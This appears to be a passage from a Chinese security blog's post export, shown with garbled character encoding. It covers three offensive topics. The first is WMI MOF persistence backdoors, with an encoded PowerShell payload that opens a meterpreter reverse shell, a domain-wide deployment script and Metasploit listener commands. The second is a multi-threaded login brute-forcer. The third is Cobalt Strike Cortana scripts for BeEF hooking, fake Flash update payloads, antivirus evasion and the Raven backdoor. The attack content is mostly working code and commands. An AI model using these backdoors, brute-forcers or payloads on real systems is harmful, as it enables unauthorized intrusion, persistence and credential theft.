GkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkADEAKQApADsAJAAyACAAPQAgACIALQBlAG4AYwAgACIAOwBpAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFMAaQB6AGUAIAAtAGUAcQAgADgAKQB7ACQAMwAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJAAzACAAJAAyACAAJABlACIAfQBlAGwAcwBlAHsAOwBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIAAkAGUAIgA7AH0A";&#125;;instance of __EventFilter as $Filt&#123; Name = "EventFilter"; EventNamespace = "Root\\Cimv2"; Query ="SELECT * FROM __InstanceCreationEvent Within 5" "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"notepad.exe\" "; QueryLanguage = "WQL";&#125;;instance of __FilterToConsumerBinding &#123; Filter = $Filt; Consumer = $Cons;&#125;; å°†ä»¥ä¸Šå†…å®¹ä¿å­˜ä¸ºtest.mofï¼Œå¦‚æœæ‹¥æœ‰ç®¡ç†å‘˜æƒé™ï¼Œå¯ä»¥å°†test.mofæ”¾åˆ°%SYSTEMROOT%/wbem/MOFç›®å½•ï¼ˆxpä»¥ä¸‹æ“ä½œç³»ç»Ÿï¼‰ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç¼–è¯‘æ‰§è¡Œæ­¤è„šæœ¬ï¼Œå¦‚æœåœ¨XP æˆ–è€…æ›´é«˜ç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸Šå¯ä»¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š1C:\&gt;mofcomp.exe c:\test.mof æ‰§è¡Œä»¥åï¼Œå½“æ‰“å¼€è®°äº‹æœ¬çš„æ—¶å€™ï¼Œåˆ™å¯ç”Ÿæˆmeterpreterä¼šè¯ï¼š åŒæ—¶ï¼Œè¿™ä¸ªmofæ–‡ä»¶æ˜¯å…æ€çš„ï¼š å½“ç„¶é™¤äº†è¿™ä¸ªæˆ‘ä»¬è¿˜å¯ä»¥åšå…¶ä»–äº‹æƒ…ï¼Œæ¯”å¦‚å…³é—­æŸä¸ªç¨‹åºï¼Œå½“å…¶å¯åŠ¨æ—¶å°±å…³é—­ï¼ŒMOFæ–‡ä»¶å¦‚ä¸‹ï¼š123456789101112131415161718192021#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")instance of CommandLineEventConsumer as $Cons&#123; Name = "Powershell Helper 2"; RunInteractively=false; CommandLineTemplate="cmd /C powershell.exe Stop-Process -processname notepad -Force";&#125;;instance of __EventFilter as $Filt&#123; Name = "EventFilter 2"; EventNamespace = "Root\\Cimv2"; Query ="SELECT * FROM __InstanceCreationEvent Within 3" "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"notepad.exe\" "; QueryLanguage = "WQL";&#125;;instance of __FilterToConsumerBinding&#123; Filter = $Filt; Consumer = $Cons;&#125;; å¦‚æœæˆ‘ä»¬æƒ³è¦è¿œç¨‹æ‰§è¡Œï¼Œå¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š1c:\&gt;mofcomp -N \\[machinename]\root\subscription test.mof å¦‚æœæˆ‘ä»¬åœ¨åŸŸå†…ï¼Œè¿˜å¯ä»¥ç”¨ä¸‹é¢çš„Powershellè„šæœ¬æ‰¹é‡è¿œç¨‹æ‰§è¡Œï¼š123456789101112131415161718192021222324252627function getNetHosts &#123;$final = @()ï¼ƒè·å–åŸŸè®¡ç®—æœº$strCategory = "computer"$objDomain = New-Object System.DirectoryServices.DirectoryEntry$objSearcher = New-Object System.DirectoryServices.DirectorySearcher$objSearcher.SearchRoot = $objDomain$objSearcher.Filter = ("(objectCategory=$strCategory)")$colProplist = "name", "cn"foreach ($i in $colPropList)&#123;$objSearcher.PropertiesToLoad.Add($i)&#125;$colResults = $objSearcher.FindAll()foreach ($objResult in $colResults) &#123; $objComputer = $objResult.Properties $bleh = $objComputer.name $final += $bleh&#125;return $final&#125;$nethosts= getNetHostsforeach ($nethost in $nethosts)&#123; write-host "Exec on " + $nethost $str = "\\"+$nethost+"\root\subscription" $m = mofcomp -N $str test.mof&#125; ä½¿ç”¨æ–¹å¼ä¸ºï¼š1c:\&gt; powershell -ExecutionPolicy Bypass .\test.ps1 # mofæ–‡ä»¶åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢ 0x02 Meterpreter Post Moduleè¿™é‡Œæœ‰ä¸€ä¸ªmsfçš„æ¨¡å—ï¼Œå¯ä»¥å®ç°æ­¤åé—¨å®‰è£…ï¼Œåœ°å€ï¼šmetasploit-modulesï¼Œä¸‹è½½ä»¥åå°†å…¶ç§»åŠ¨åˆ°post/windows/ æ–‡ä»¶å¤¹åˆ™å¯ä½¿ç”¨ï¼š 1â˜ persistence [master] mv mof_ps_persist.rb $msf_path/modules/post/windows/ åœ¨è·å–meterpreterä¼šè¯ä»¥åï¼Œå®‰è£…æ­¤åé—¨ï¼š12345678msf exploit(web_delivery) &gt; use post/windows/mof_ps_persist msf post(mof_ps_persist) &gt; set LHOST 192.168.101.1 LHOST =&gt; 192.168.101.1msf post(mof_ps_persist) &gt; set lport 8887lport =&gt; 8887msf post(mof_ps_persist) &gt; set session 4session =&gt; 4msf post(mof_ps_persist) &gt; run é»˜è®¤payloadä¸ºwindows/meterpreter/reverse_tcpï¼Œæ‰§è¡Œæ—¶é—´é—´éš”ä¸º60ç§’ï¼Œå¦‚æœæƒ³é€šè¿‡è§¦å‘æ–¹å¼å¯åŠ¨ï¼Œå¯ä»¥è‡ªè¡Œä¿®æ”¹rubyè„šæœ¬ã€‚ å¼€å¯ç›‘å¬ï¼š12345678msf post(mof_ps_persist) &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 192.168.101.1 lhost =&gt; 192.168.101.1msf exploit(handler) &gt; set lport 8887lport =&gt; 8887msf exploit(handler) &gt; exploit -j å¦‚æœçœ‹åˆ°é”™è¯¯80041003ï¼Œè¯´æ˜æƒé™ä¸å¤Ÿï¼Œå¯ä»¥è¯•è¯•è¯•ç”¨bypassuac,å…·ä½“æ€ä¹ˆbypassï¼Œè¯·æˆ³æˆ‘ã€‚ å½“ä¼šè¯ä¸­æ–­ä»¥åï¼Œç”±äºmofè‡ªåŠ¨æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥é‡æ–°è·å–meterpreterä¼šè¯ã€‚å½“å¯¹æ–¹ç”µè„‘é‡å¯ä»¥åï¼Œä»å¯ä»¥è·å–ä¼šè¯ã€‚ å¦‚æœæƒ³è¦æ¸…é™¤åé—¨ï¼Œå¯ä»¥resource ç”Ÿæˆçš„rcæ–‡ä»¶ã€‚ 0x03 åœæ­¢MOFè¦åœæ­¢mofï¼Œå¯è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š ç¬¬ä¸€ net stop winmgmt åœæ­¢æœåŠ¡ï¼Œç¬¬äºŒ åˆ é™¤æ–‡ä»¶å¤¹ï¼šC:\WINDOWS\system32\wbem\Repository\ç¬¬ä¸‰ net start winmgmt å¯åŠ¨æœåŠ¡ 0x04 å°ç»“æœ¬ç¯‡æ–‡ç« ä¸»è¦ä»‹ç»äº†ä¸€äº›ç»“åˆMOFä¸powershellæ¥è¿›è¡Œåˆ¶ä½œåé—¨çš„æ–¹å¼æ–¹æ³•ï¼Œå¯¹äºMOFå¤§å®¶å¯èƒ½æ¥è§¦æœ€å¤šçš„å°±æ˜¯åœ¨MYSQLææƒæ—¶ä½¿ç”¨MOFæ¥ææƒï¼Œå…¶å®ç©å„¿æ³•è¿˜å¾ˆå¤šï¼Œå¤§å®¶å¯ä»¥ç»§ç»­æ¥ç ”ç©¶ç ”ç©¶ï¼Œå¸Œæœ›æ­¤æ–‡å¯¹ä½ æœ‰å¸®åŠ©ã€‚ å‚è€ƒï¼š http://drops.wooyun.org/tips/10346 http://drops.wooyun.org/tips/9973 http://drops.wooyun.org/tips/8290 http://www.codeproject.com/Articles/27914/WMI-MOF-Basics http://www.codeproject.com/Articles/28226/Creating-WMI-Permanent-Event-Subscriptions-Using-M http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html http://www.cnblogs.com/2018/archive/2010/09/25/1834879.html http://www.jb51.net/article/52489.htm]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>backdoor</tag>
        <tag>mof</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Multi-Threaded Brute Forcer]]></title>
    <url>%2Farchives%2FMulti-Threaded_Brute_Forcer.html</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/usr/bin/python import threadingimport Queueimport socket usernameList = open('users.txt','r').read().splitlines()passwordList = open('passwords.txt','r').read().splitlines() class WorkerThread(threading.Thread) : def __init__(self, queue, tid) : threading.Thread.__init__(self) self.queue = queue self.tid = tid def run(self) : while True : username = None try : username = self.queue.get(timeout=1) except Queue.Empty : return try : for password in passwordList: tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) tcpSocket.connect(('### IP Address ###',### Port ###)) tcpSocket.recv(1024) tcpSocket.send("### Syntax that allows login ###") if '### Fail Response ###' in tcpSocket.recv(1024): tcpSocket.close() print "Failed " + username + "/" + password else: print "[+] Successful Login! Username: " + username + " Password: " + password except : raise self.queue.task_done() queue = Queue.Queue() threads = []for i in range(1, 40) : # Number of threads worker = WorkerThread(queue, i) worker.setDaemon(True) worker.start() threads.append(worker) for username in usernameList : queue.put(username) # Push usernames onto queue queue.join() # wait for all threads to exit for item in threads : item.join() print "Testing Complete!"]]></content>
      <categories>
        <category>éšä¾¿å†™å†™</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>brute</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¼ºåŒ–ä½ çš„Cobalt strikeä¹‹Cortana]]></title>
    <url>%2Farchives%2FCortana.html</url>
    <content type="text"><![CDATA[Cortanaæ˜¯å¯ä»¥ç”¨äºCobalt strikeä»¥åŠArmitageçš„è„šæœ¬ï¼Œé€šè¿‡åŠ è½½cortanaå¯ä»¥å‘Cobalt strikeä¸­å¯¼å…¥æ–°çš„ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œæœ€å¤§çš„å¥½å¤„å°±æ˜¯å„ç§ç¬¬ä¸‰æ–¹å·¥å…·éƒ½è¿›è¡Œäº†å¯è§†åŒ–ï¼Œä½ å¯ä»¥é€šè¿‡ç‚¹å‡»è€Œä¸æ˜¯é€šè¿‡å‘½ä»¤è¡Œæ¥å®Œæˆä¸€äº›æ“ä½œï¼Œå½“ç„¶ï¼Œé€šè¿‡å®šåˆ¶cortanaè„šæœ¬ï¼Œä½ å¯ä»¥åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å¾ˆæ–¹ä¾¿çš„åšä¸€äº›æ‰¹é‡æ“ä½œæˆ–è€…è‡ªåŠ¨åŒ–æ”»å‡»ç­‰ã€‚æœ¬ç¯‡æ–‡ç« ä¸»è¦é€‰å–äº†ä¸€äº›ç°æœ‰çš„cortanaè„šæœ¬ï¼Œæ¥è¿›è¡Œç®€å•çš„ä»‹ç»ã€‚ ä½ å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤ä¸‹è½½cortana-scriptsï¼š1root@kali:~# git clone https://github.com/rsmudge/cortana-scripts.git æœ¬æ¬¡æµ‹è¯•ä½¿ç”¨çš„æ˜¯Cobalt strike2.5ï¼Œä¸‹è½½åœ°å€:æˆ³æˆ‘(è‡ªè¡ŒéªŒè¯å®‰å…¨æ€§) 0x00 Cortana consoleé™¤äº†å¯è§†åŒ–æ“ä½œï¼Œcortanaä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œæ“ä½œï¼Œä¾æ­¤ç‚¹å‡»View-&gt;Script Consoleï¼Œåˆ™å¯æ‰“å¼€ï¼Œä½¿ç”¨Helpå¯ä»¥çœ‹åˆ°å¦‚ä¸‹å‡ ä¸ªå‘½ä»¤ï¼š123456789101112131415161718cortana&gt; helpCommands--------askoff #å‚æ•°ä¸ºcnaè„šæœ¬ï¼Œå…³é—­è„šæœ¬äº¤äº’åŠŸèƒ½askon #å‚æ•°ä¸ºcnaè„šæœ¬ï¼Œå¼€å¯è„šæœ¬äº¤äº’åŠŸèƒ½help #æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯load #å‚æ•°ä¸ºè·¯å¾„ï¼ŒåŠ è½½Cortanaè„šæœ¬logoff #å‚æ•°ä¸ºcnaè„šæœ¬ï¼Œå…³é—­è„šæœ¬æ—¥å¿—è®°å½•logon #å‚æ•°ä¸ºcnaè„šæœ¬ï¼Œå¼€å¯è„šæœ¬æ—¥å¿—è®°å½•ls #åˆ—å‡ºåŠ è½½çš„è„šæœ¬proff #å‚æ•°ä¸ºcnaè„šæœ¬ï¼Œå…³é—­è„šæœ¬åˆ†æå™¨profile #å‚æ•°ä¸ºcnaè„šæœ¬ï¼ŒæŸ¥çœ‹è„šæœ¬ç®€ä»‹pron #å‚æ•°ä¸ºcnaè„šæœ¬ï¼Œå¼€å¯è„šæœ¬åˆ†æå™¨reload #å‚æ•°ä¸ºcnaè„šæœ¬ï¼Œé‡æ–°åŠ è½½è„šæœ¬troff #å‚æ•°ä¸ºcnaè„šæœ¬ï¼Œå…³é—­è„šæœ¬è·Ÿè¸ªåŠŸèƒ½tron #å‚æ•°ä¸ºcnaè„šæœ¬ï¼Œå¼€å¯è„šæœ¬è·Ÿè¸ªåŠŸèƒ½unload #å‚æ•°ä¸ºcnaè„šæœ¬ï¼Œå¸è½½è„šæœ¬ ä¸‹é¢å°†ä»‹ç»å‡ ä¸ªå¥½ç”¨çš„è„šæœ¬ã€‚ 0x01 Beef_strickBeefæ˜¯ä¸€æ¬¾é’ˆå¯¹æµè§ˆå™¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œä¹‹å‰ä¸‰å¥½å­¦ç”Ÿå¸ˆå‚…å·²ç»å¯¹ä»–æœ‰ä¸€ä¸ªæ¯”è¾ƒè¯¦ç»†çš„ä»‹ç»ï¼Œè€Œbeef_strickåˆ™æ˜¯å¯ä»¥åœ¨Cobalt strikeåŠArmitageä¸­åŠ è½½Beefçš„ä¸€ä¸ªCortanaè„šæœ¬ï¼Œè¦ä½¿ç”¨æ­¤è„šæœ¬ï¼Œé¦–å…ˆè¦å…ˆä¸‹è½½å®‰è£…msfçš„beefæ’ä»¶ã€‚1234root@kali:~# git clone https://github.com/xntrik/beefmetasploitplugin.gitroot@kali:~# cd beefmetasploitplugin/root@kali:~/beefmetasploitplugin# cp plugins/* /usr/share/metasploit-framework/plugins/root@kali:~/beefmetasploitplugin# cp -R lib/* /usr/share/metasploit-framework/lib/ å®‰è£…ä¾èµ–åº“ï¼Œæ‰§è¡Œï¼š12root@kali:~# gem install hpricotroot@kali:~# gem install json å¦‚æœä¸èƒ½æ›´æ–°ï¼Œå¯ä»¥æ¢æˆæ·˜å®çš„rubyæºï¼Œåœ°å€ä¸ºhttps://ruby.taobao.org/ å¯åŠ¨msf:12root@kali:~# service postgresql startroot@kali:~# msfconsole åŠ è½½beef1msf &gt; load beef åœ¨è¿™é‡Œæœ‰ä¸ªå‘ï¼Œå°±æ˜¯å¯èƒ½ä¼šç¢°åˆ°è¿™ä¸ªé”™è¯¯ï¼šç»è¿‡å¤šæ¬¡ç ”ç©¶æœ€ç»ˆæ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œç›´æ¥å¤åˆ¶ï¼š1cp -R /var/lib/gems/2.1.0/gems/hpricot-0.8.6/lib/* /usr/lib/ruby/vendor_ruby/ ç°åœ¨å†å¯åŠ¨msfï¼Œå°±å¯ä»¥åŠ è½½beefäº†ï¼Œå¦‚ä¸‹å›¾ï¼š è¿›å…¥åˆ°cortana-scriptsçš„beef_strikeç›®å½•ï¼ˆæµ‹è¯•å‘ç°ï¼Œæœ€æ–°ç‰ˆæœ¬çš„è²Œä¼¼æœ‰é—®é¢˜ï¼Œæ‰€ä»¥æ‰¾åˆ°äº†å†å²ç‰ˆæœ¬çš„æ¥åšæµ‹è¯•ï¼šåœ°å€è¯·æˆ³æˆ‘ï¼‰ï¼Œä¿®æ”¹beef_strike.cnaæ–‡ä»¶ï¼Œå°†importçš„ç›®å½•æ”¹åˆ°å½“å‰beef_strikeçš„ç›®å½•: é™¤æ­¤ä¹‹å¤–ï¼Œä¸‹è½½ä»¥ä¸‹jaræ”¾åˆ°libç›®å½•ï¼š123root@kali:~/beef_strike# cd libroot@kali:~/beef_strike/lib/# wget https://evi1cg.github.io/payloads/lib.rar #è€å¤–æ•´ç†çš„jaråŒ…ï¼Œè¯·è‡ªè¡ŒéªŒè¯å®‰å…¨æ€§ï¼Œä¸æ”¾å¿ƒå¯ä»¥è‡ªå·±ä¸‹è½½ç›¸åº”jaråŒ…root@kali:~/beef_strike/lib/# unrar x lib.rar ä¹‹åè¿è¡Œcobaltstrikeæˆ–è€…armitage(ä¸æ”¯æŒcobaltstrike3.0)ï¼Œä»¥ä¸‹ä»¥cobaltstrikeåšç¤ºä¾‹ï¼šé¦–å…ˆåŠ è½½beef_strikeï¼Œä¾æ­¤ç‚¹å‡»cobaltstrike-&gt;Scripts-&gt;loadï¼Œé€‰æ‹©beef_strike.cna è¿æ¥beefï¼Œé€‰æ‹©Attacks-&gt;BeEF Strike-&gt;Start-&gt;control BeFF serviceï¼Œé…ç½®beefè·¯å¾„ï¼Œç„¶åç‚¹å‡»stratå¼€å¯beefæœåŠ¡ï¼Œä¹‹åè¿æ¥beefæœåŠ¡ï¼Œå¦‚ä¸‹å›¾ï¼š ç‚¹å‡»Conectä¹‹åå¡«å…¥beefæœåŠ¡åœ°å€ï¼Œç”¨æˆ·åï¼Œå¯†ç å°±å¯ä»¥è¿æ¥beefäº†ï¼Œè¿™é‡Œæ¯”è¾ƒé‡è¦çš„æ˜¯è¿™ä¸ªkeyï¼Œå¦‚ä¸‹å›¾ï¼šå¤åˆ¶è¿™ä¸ªkeyï¼Œåœ¨è¿æ¥å¤„é‚£é‡Œç‚¹å‡»keyï¼Œå¹¶å°†æ­¤å€¼å¡«å…¥ï¼Œå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ã€‚ åªéœ€è¦å°†http://192.168.74.144:3000/hook.jsæ’å…¥å­˜åœ¨xssçš„ç½‘ç«™ï¼Œæˆ–è€…ä»¥ä»»æ„æ–¹å¼æ‰§è¡Œè¯¥jsï¼Œbeefä¸Šé¢å°±å¯ä»¥çœ‹åˆ°ä¸»æœºä¸Šçº¿äº†ï¼Œå°è¯•è®¿é—®http://192.168.74.144:3000/demos/basic.htmlæµ‹è¯•ï¼š é€‰æ‹©ä¸€ä¸ªè®¡ç®—æœºï¼Œç‚¹å‡»å³é”®ï¼Œbeefï¼Œå¯ä»¥çœ‹åˆ°å…¶åŸºæœ¬ä¿¡æ¯ï¼Œå³é”®å¯ä»¥çœ‹åˆ°beefæ›´å¤šçš„åŠŸèƒ½ï¼š æ¯”å¦‚ç¤¾ä¼šå·¥ç¨‹å­¦å·¥å…·é‡Œé¢çš„fake flash updateï¼Œç‚¹å‡»æ­¤æŒ‰é’®ä¹‹åè¾“å‡ºå¦‚ä¸‹å‚æ•°é…ç½®ï¼š1"payload_uri":"http://192.168.74.144:81/download/test.exe","image":"http://192.168.74.145:3000/demos/adobe_flash_update.png" å¦‚ä¸‹å›¾ï¼š ä¹‹åå—å®³è€…å°±ä¼šçœ‹åˆ°ä¸€ä¸ªå‡çº§ä¿¡æ¯ï¼šç‚¹å‡»ä»¥åå°±ä¼šä¸‹è½½æˆ‘ä»¬æŒ‡å®šçš„exeã€‚æ›´å¤šçš„åŠŸèƒ½åœ¨ï¼šè¿™é‡Œå¯ä»¥è®¾ç½®è‡ªåŠ¨è¿è¡Œçš„å¤šä¸ªå‘½ä»¤ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥ç»§ç»­è¿›è¡Œç ”ç©¶ï¼Œå…·ä½“Beefä½¿ç”¨è¯¦è§ï¼šæµè§ˆå™¨åˆ©ç”¨æ¡†æ¶BeEFæµ‹è¯•ã€‚ 0x02 Veil_evasionVeilæ˜¯ä¸€æ¬¾åˆ©ç”¨Metasploitæ¡†æ¶ç”Ÿæˆç›¸å…¼å®¹çš„Payloadå·¥å…·ï¼Œå¹¶ä¸”åœ¨å¤§å¤šæ•°ç½‘ç»œç¯å¢ƒä¸­Veil èƒ½ç»•è¿‡å¸¸è§çš„æ€æ¯’è½¯ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¸‹è½½ï¼š1root@kali:~# git clone https://github.com/Veil-Framework/Veil-Evasion.git ä¸‹è½½ä»¥åè¿›è¡Œé…ç½®å®‰è£…ï¼š12root@kali:~# cd Veil-Evasion/setup/root@kali:~/Veil-Evasion/setup# ./setup.sh ä¹‹åå°±å®‰è£…pythonç­‰ä¸€ç³»åˆ—ç¯å¢ƒå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ã€‚åŠ è½½Veil_evasionï¼Œä¾æ­¤ç‚¹å‡»cobaltstrike-&gt;Scripts-&gt;loadï¼Œé€‰æ‹©Veil_evasion.cnaï¼Œä¹‹åè¾“å…¥Veil-Evasion.pyçš„ç»å¯¹è·¯å¾„å°±æˆåŠŸåŠ è½½ Veil_evasionäº†ï¼Œå¦‚ä¸‹å›¾ï¼šå¦‚æœVeil_evasionè·¯å¾„è¾“å…¥é”™è¯¯ï¼Œå¯ä»¥å†set Veil_evasion Pathå¤„ä¿®æ”¹ã€‚ç‚¹å‡»Generate,å°±å¯ä»¥çœ‹åˆ°ç”Ÿæˆpayloadç•Œé¢ï¼šé€šè¿‡åŒå‡»Payloadï¼ŒMSFPayloadå¯ä»¥é€‰æ‹©ä¸åŒçš„ç”Ÿæˆæ–¹å¼ï¼Œä¾‹å¦‚ï¼šPayloadé€‰æ‹©c/meterpreter/rev_tcp,MSFPayloadé€‰æ‹©windows/meterpreter/reverse_tcpï¼Œä¸€å®šè¦é€‰åŒç±»å‹çš„ï¼Œè®¾ç½®ç›‘å¬ipåŠç«¯å£ä»¥åï¼Œç‚¹å‡»Generateï¼Œåˆ™å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„è·¯å¾„ï¼Œç‚¹å‡»okåˆ™å¯ç”Ÿæˆpayloadï¼Œå¦‚ä¸‹å›¾ï¼š 0x03 Login_autopwnæ­¤è„šæœ¬å¯ç”¨äºç”¨æˆ·å£ä»¤ç ´è§£ï¼Œå¯ä»¥è‡ªåŠ¨åŒ–æµ‹è¯•å¤šä¸ªæœåŠ¡ï¼Œä¹Ÿå¯ä»¥é’ˆå¯¹å•ä¸ªæœåŠ¡è¿›è¡Œå£ä»¤ç ´è§£ï¼Œå¯ç ´è§£çš„æœåŠ¡åŒ…æ‹¬ssh,smb,ftp,telnet,vnc,vmauthd,pcanywhere,mssql,mysqlç­‰ï¼Œä½¿ç”¨å‰éœ€è¦ä¿®æ”¹å­—å…¸è·¯å¾„ï¼š ä»¥åŠjohnå­—å…¸è·¯å¾„ï¼š ä¿®æ”¹ä»¥åï¼Œä¾æ­¤ç‚¹å‡»cobaltstrike-&gt;Scripts-&gt;loadï¼Œé€‰æ‹©login_autopwn.cnaï¼Œä¹‹åé€šè¿‡ç‚¹å‡»View-&gt;Script Consoleçš„æ‰“å¼€Cortana,åˆ™å¯çœ‹åˆ°å·²ç»åŠ è½½ login_autopwnï¼š è¾“å…¥helpï¼Œå¯ä»¥æŸ¥çœ‹å‘½ä»¤ï¼š è·å–æœåŠ¡ä¿¡æ¯ä¹‹åï¼Œç›´æ¥è¾“å…¥startåˆ™å¯ä»¥è¿›è¡Œè‡ªåŠ¨åŒ–å£ä»¤æ¢æµ‹ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€‰æ‹©æŸä¸ªæ¨¡å—æ¥è¿›è¡Œæ¢æµ‹ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªdemo: 0x04 RavenRavenæ˜¯ä¸€ä¸ªWindowsåé—¨ï¼Œä»–å¯ä»¥è®¿é—®æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ï¼Œä¸‹è½½RAW shellcodeï¼Œå¦‚æœä»£ç å¯ç”¨ï¼Œä»–å°†å°†ä»£ç æ³¨å…¥åˆ°å…¶ä»–è¿›ç¨‹ä¸­ï¼Œå¯ä»¥é€šè¿‡â€,â€æ¥åˆ›å»ºå¤šä¸ªURLåˆ—è¡¨ï¼ŒRavenå°†ä¼šé‡‡ç”¨å¾ªç¯çš„æ–¹å¼è¿›è¡Œå°è¯•ï¼Œå®‰è£…Ravenä»¥åï¼Œä»–æ¯éš”5åˆ†é’Ÿä¼šè®¿é—®ä¾æ­¤æ§åˆ¶æœåŠ¡å™¨ï¼Œå®‰è£…æ–¹æ³•ä¸ºï¼š å¤åˆ¶raven.dll åˆ° c:\windows\linkinfo.dllã€‚ å®‰è£…raven.exeï¼Œå¯ä»¥æ·»åŠ æ³¨å†Œè¡¨æˆ–è€…æ·»åŠ æœåŠ¡ã€‚ Cortana scriptä¸­å·²ç»é›†æˆäº†Ravençš„ä½¿ç”¨è„šæœ¬ï¼Œä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼šstep1ï¼šæ‰“å¼€ç»ˆç«¯ï¼Œå¼€å¯webæœåŠ¡;1root@kali:~# service apache2 start step2ï¼šä¾æ¬¡ç‚¹å‡»View-&gt;Script console;step3ï¼šåŠ è½½server.cna,client.cna; åŠ è½½server.cnaä¹‹å‰ç¡®ä¿webæ ¹ç›®å½•é…ç½®æ­£ç¡® step4ï¼šä¾æ­¤ç‚¹å‡»View-&gt;Raven;step5ï¼šç‚¹å‡»Export EXEï¼Œé…ç½®æœåŠ¡å™¨åœ°å€ï¼Œhttp://ip/foo ç”Ÿæˆexe;step6ï¼šè¿è¡Œexeï¼Œä¹‹åä¼šçœ‹åˆ°è¿™æ ·ï¼š step7ï¼šå¼€å¯msfç›‘å¬ï¼Œä½¿ç”¨windows/meterpreter/reverse_tcp ï¼Œç«¯å£ä¸º4444ã€‚step8ï¼šå½“æœ‰å®¢æˆ·ç«¯è¿å…¥æ—¶ï¼Œå³é”®ï¼ŒMeterp tcp,ç«¯å£ä¸ºä¹‹å‰çš„ç«¯å£ï¼Œåˆ™å¯è·å–ä¼šè¯ã€‚ 0x05 OthersQRcodeï¼šç”¨äºç”Ÿæˆç½‘å€çš„äºŒç»´ç ï¼Œå®ƒä½¿ç”¨äº†googleçš„apiï¼Œä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥ä½¿ç”¨äº†ã€‚annoyï¼šç”¨äºéªšæ‰°ç”¨æˆ·çš„å°è„šæœ¬ï¼ŒåŒ…æ‹¬å¼¹æ¡†ï¼Œç¦ç”¨é¼ æ ‡ã€é”®ç›˜ï¼Œå…³è¿›ç¨‹ï¼Œå…³æœºç­‰ã€‚iconsï¼šå¢åŠ äº†å¾ˆå¤šå›¾æ ‡ï¼Œçœ‹èµ·æ¥ä¼šæ›´ç‚«é…·ã€‚autoDiscoverï¼šç”¨äºå‘ç°æ–°çš„ç½‘ç»œã€‚autoarpï¼šarpæ‰«æï¼Œç”¨äºå‘ç°ç½‘ç»œä¸»æœºã€‚autofindï¼šç”¨äºæŸ¥æ‰¾ä¸€äº›æŒ‡å®šæ–‡ä»¶å¹¶ä¸‹è½½ã€‚autohackï¼šè¿™é‡Œå…±æœ‰ä¸‰ä¸ªè„šæœ¬ï¼Œautohackç”¨äºè‡ªåŠ¨æ”»å‡»ï¼Œå½“å‘ç°22ç«¯å£æ—¶ï¼Œä½¿ç”¨å¯¹åº”çš„æ¨¡å—è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå‘ç°445ç«¯å£åˆ™å°è¯•ä½¿ç”¨ms08_067,è‡ªå·±å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦è¿›è¡Œä¿®æ”¹ï¼›autohashç”¨äºè‡ªåŠ¨æ‰§è¡Œææƒå¹¶è¿›è¡Œhashdumpæ“ä½œï¼Œè¯»å–åˆ°çš„hashå°†å­˜å…¥æ•°æ®åº“ï¼Œæ‰§è¡Œcredsåˆ™å¯ä»¥çœ‹åˆ°å­˜å‚¨çš„hashä¿¡æ¯ï¼›autopsexecç”¨äºå‘ç°445ç«¯å£å¼€æ”¾æ—¶ï¼Œä½¿ç”¨psexecæ¥æµ‹è¯•ç™»é™†ï¼Œä½¿ç”¨çš„å¯†ç ä¸ºæ•°æ®åº“å­˜å‚¨çš„hashä¿¡æ¯ã€‚autoscanï¼šè‡ªåŠ¨æ‰«æè„šæœ¬ï¼Œè¿™é‡Œä¹Ÿæœ‰ä¿©ï¼Œautomsfscanç”¨äºåœ¨hostsåˆ—è¡¨å¢åŠ æ—¶è‡ªåŠ¨æ‰§è¡Œmsfscanæ“ä½œï¼›autonessuså°†åœ¨hostsåˆ—è¡¨å¢åŠ 